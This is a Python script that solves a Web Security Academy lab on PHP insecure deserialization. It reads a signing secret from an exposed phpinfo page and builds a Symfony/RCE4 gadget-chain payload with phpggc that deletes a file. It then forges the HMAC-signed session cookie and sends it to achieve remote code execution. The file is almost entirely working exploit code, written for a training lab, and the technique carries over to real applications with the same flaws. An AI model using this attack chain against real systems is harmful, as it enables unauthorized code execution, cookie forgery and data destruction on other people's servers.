# Script to solve Web Security Academy - Exploiting PHP deserialization with a pre-built gadget chain.
# See: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain

# First: Use phpggc to make serialized object with malicious payload (for PHP Symfony framework) that can be injected because of insecure deserialization.
# Then: Do some encoding of the object, generate cookie signature, make new cookie string containing the information, and send the cookie in a GET request.
# Arguments: 1) Path to phpggc command (generates malicious serialized object); 2) URL to lab web page (on WSA).
# Run: python3 $phpggc_path, https://url_to_lab_web_page

import subprocess
import sys
import requests
import re
import urllib.parse
import base64
from hashlib import sha1
import hmac

# Get secret needed to sign cookie from web page
def get_secret(url):
    resp = requests.get(url+"cgi-bin/phpinfo.php")
    pattern_match = re.search('SECRET_KEY.*?([A-Za-z0-9]{10,})', resp.text) # Use '*?' for non-greedy matching of characters before the secret
    return pattern_match.group(1)

# Generate and return cookie signature based on cookie string
def sign_cookie(c_string, secret):
    #secret = b"ulqnki707hbuf4nhofb7l1nu62k0marw" # Old example, the secret keeps changing
    secret = secret.encode() # Need byte string
    signature = hmac.new(secret, c_string, sha1)
    return str(signature.hexdigest())


# Getting arguments
phpggc_path = sys.argv[1]
wsa_lab_url = sys.argv[2]

# Executing phpggc command to generate malicious serialized object
ps = subprocess.run([phpggc_path, "Symfony/RCE4", "exec", "rm /home/carlos/morale.txt"], check=True, stdout=subprocess.PIPE)
b64 = base64.b64encode(ps.stdout) # base64 encode the serialized object 
the_secret = get_secret(wsa_lab_url)
cookie_signature = sign_cookie(b64, the_secret) # Generate signature for 'signing' the cookie
cookie_str = f"{{\"token\":\"{b64.decode('utf-8')}\",\"sig_hmac_sha1\":\"{cookie_signature}\"}}" # Made string by hand to ensure it is exactly the same as the one returned by php
encoded_cookie_str = urllib.parse.quote_plus(cookie_str) # Url encode the cookie string
print("The encoded cookie string:", encoded_cookie_str)
cookies = dict(session=encoded_cookie_str)
resp = requests.get(wsa_lab_url, cookies=cookies) # GET request to url, for sending the malicious payload in the cookie

if "Congratulations, you solved the lab!" in resp.text:
    print("Lab solved! :)")

